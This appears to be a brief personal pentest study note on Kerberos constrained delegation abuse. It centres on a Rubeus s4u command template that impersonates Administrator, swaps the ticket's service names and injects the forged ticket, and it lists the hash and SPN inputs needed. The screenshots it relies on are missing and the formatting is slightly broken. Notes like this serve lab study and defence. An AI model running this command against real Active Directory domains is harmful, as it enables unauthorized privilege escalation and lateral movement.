enumerate:
![[Pasted image 20250901064938.png]]
> *NOTE‼️:* *If `useraccountcontrol` flag was only `WORKSTATION_TRUST_ACCOUNT` so only kerberos is enabled not any protocol. In this case we have any authentication protocol enabled.*

full command is:  ```
```powershell
Rubeus.exe s4u /user:<USER_OR_COMPUTER> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:<VALID_SPN> /altservice:cifs,host,ldap,http /ptt
```
so now we need:
1. the name of the machine/user that has constrained delegation
2. hash
3. msdsspn (which we can like this:)
![[Pasted image 20250901070714.png]]

 